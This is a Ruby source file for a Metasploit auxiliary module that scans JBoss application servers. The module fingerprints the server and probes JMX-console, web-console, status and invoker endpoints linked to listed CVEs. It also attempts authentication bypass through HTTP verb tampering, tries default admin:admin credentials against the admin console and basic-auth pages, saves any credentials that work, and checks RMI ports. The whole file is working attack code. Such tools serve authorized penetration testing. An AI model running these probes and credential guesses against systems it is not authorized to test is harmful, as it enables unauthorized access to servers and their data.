##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'                  => 'JBoss Vulnerability Scanner',
      'Description'           => %q(
        This module scans a JBoss instance for a few vulnerabilities.
      ),
      'Author'                =>
        [
          'Tyler Krpata',
          'Zach Grace <@ztgrace>'
        ],
      'References'            =>
        [
          [ 'CVE', '2008-3273' ], # info disclosure via unauthenticated access to "/status"
          [ 'CVE', '2010-1429' ], # info disclosure via unauthenticated access to "/status" (regression)
          [ 'CVE', '2010-0738' ], # VERB auth bypass on "JMX-Console": /jmx-console/
          [ 'CVE', '2010-1428' ], # VERB auth bypass on "Web Console": /web-console/
          [ 'CVE', '2017-12149' ] # deserialization: "/invoker/readonly"
        ],
      'License'               => BSD_LICENSE
      ))

    register_options(
      [
        OptString.new('VERB',  [ true,  "Verb for auth bypass testing", "HEAD"])
      ])
  end

  def run_host(ip)
    res = send_request_cgi(
      {
        'uri'       => "/" + Rex::Text.rand_text_alpha(12),
        'method'    => 'GET',
        'ctype'     => 'text/plain'
      })

    if res

      info = http_fingerprint(:response => res)
      print_status(info)

      if res.body && />(JBoss[^<]+)/.match(res.body)
        print_error("#{rhost}:#{rport} JBoss error message: #{$1}")
      end

      apps = [
        '/jmx-console/HtmlAdaptor',
        '/jmx-console/checkJNDI.jsp',
        '/status',
        '/web-console/ServerInfo.jsp',
        # apps added per Patrick Hof
        '/web-console/Invoker',
        '/invoker/JMXInvokerServlet',
        '/invoker/readonly'
      ]

      print_status("#{rhost}:#{rport} Checking http...")
      apps.each do |app|
        check_app(app)
      end

      jboss_as_default_creds

      ports = {
        # 1098i, 1099, and 4444 needed to use twiddle
        1098 => 'Naming Service',
        1099 => 'Naming Service',
        4444 => 'RMI invoker'
      }
      print_status("#{rhost}:#{rport} Checking services...")
      ports.each do |port, service|
        status = test_connection(ip, port) == :up ? "open" : "closed"
        print_status("#{rhost}:#{rport} #{service} tcp/#{port}: #{status}")
      end
    end
  end

  def check_app(app)
    res = send_request_cgi({
      'uri'       => app,
      'method'    => 'GET',
      'ctype'     => 'text/plain'
    })



    unless res
      print_status("#{rhost}:#{rport} #{app} not found")
      return
    end

    case
    when res.code == 200
      print_good("#{rhost}:#{rport} #{app} does not require authentication (200)")
    when res.code == 403
      print_status("#{rhost}:#{rport} #{app} restricted (403)")
    when res.code == 401
      print_status("#{rhost}:#{rport} #{app} requires authentication (401): #{res.headers['WWW-Authenticate']}")
      bypass_auth(app)
      basic_auth_default_creds(app)
    when res.code == 404
      print_status("#{rhost}:#{rport} #{app} not found (404)")
    when res.code == 301, res.code == 302
      print_status("#{rhost}:#{rport} #{app} is redirected (#{res.code}) to #{res.headers['Location']} (not following)")
    when res.code == 500 && app == "/invoker/readonly"
      print_good("#{rhost}:#{rport} #{app} responded (#{res.code})")
    else
      print_status("#{rhost}:#{rport} Don't know how to handle response code #{res.code}")
    end
  end

  def jboss_as_default_creds
    print_status("#{rhost}:#{rport} Checking for JBoss AS default creds")

    session = jboss_as_session_setup(rhost, rport)
    return false if session.nil?

    # Default AS creds
    username = 'admin'
    password = 'admin'

    res = send_request_raw({
      'uri'      => '/admin-console/login.seam',
      'method'   => 'POST',
      'version'  => '1.1',
      'vhost'    => "#{rhost}",
      'headers'  => { 'Content-Type'  => 'application/x-www-form-urlencoded',
                      'Cookie'        => "JSESSIONID=#{session['jsessionid']}"
                    },
      'data'     => "login_form=login_form&login_form%3Aname=#{username}&login_form%3Apassword=#{password}&login_form%3Asubmit=Login&javax.faces.ViewState=#{session["viewstate"]}"
    })

    # Valid creds if 302 redirected to summary.seam and not error.seam
    if res && res.code == 302 && res.headers.to_s !~ /error.seam/m && res.headers.to_s =~ /summary.seam/m
      print_good("#{rhost}:#{rport} Authenticated using #{username}:#{password} at /admin-console/")
      add_creds(username, password)
    else
      print_status("#{rhost}:#{rport} Could not guess admin credentials")
    end
  end

  def add_creds(username, password)
    service_data = {
      address: rhost,
      port: rport,
      service_name: 'jboss',
      protocol: 'tcp',
      workspace_id: framework.db.workspace.id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: password,
      private_type: :password,
      username: username
    }.merge(service_data)

    credential_core = create_credential(credential_data)
    credential_data[:core] = credential_core
    create_credential_login(credential_data)
  end

  def jboss_as_session_setup(rhost, rport)
    res = send_request_raw({
      'uri'       => '/admin-console/login.seam',
      'method'    => 'GET',
      'version'   => '1.1',
      'vhost'     => "#{rhost}"
    })

    unless res
      return nil
    end

    begin
      viewstate = /javax.faces.ViewState" value="(.*)" auto/.match(res.body).captures[0]
      jsessionid = /JSESSIONID=(.*);/.match(res.headers.to_s).captures[0]
    rescue ::NoMethodError
      print_status("#{rhost}:#{rport} Could not guess admin credentials")
      return nil
    end

    { 'jsessionid' => jsessionid, 'viewstate' => viewstate }
  end

  def bypass_auth(app)
    print_status("#{rhost}:#{rport} Check for verb tampering (#{datastore['VERB']})")

    res = send_request_raw({
      'uri'       => app,
      'method'    => datastore['VERB'],
      'version'   => '1.0' # 1.1 makes the head request wait on timeout for some reason
    })

    if res && res.code == 200
      print_good("#{rhost}:#{rport} Got authentication bypass via HTTP verb tampering")
    else
      print_status("#{rhost}:#{rport} Could not get authentication bypass via HTTP verb tampering")
    end
  end

  def basic_auth_default_creds(app)
    res = send_request_cgi({
      'uri'       => app,
      'method'    => 'GET',
      'ctype'     => 'text/plain',
      'authorization' => basic_auth('admin', 'admin')
    })

    if res && res.code == 200
      print_good("#{rhost}:#{rport} Authenticated using admin:admin at #{app}")
      add_creds("admin", "admin")
    else
      print_status("#{rhost}:#{rport} Could not guess admin credentials")
    end
  end

  # function stole'd from mssql_ping
  def test_connection(ip, port)
    begin
      sock = Rex::Socket::Tcp.create(
        'PeerHost' => ip,
        'PeerPort' => port,
        'Timeout' => 20
      )
    rescue Rex::ConnectionError
      return :down
    end
    sock.close
    return :up
  end
end
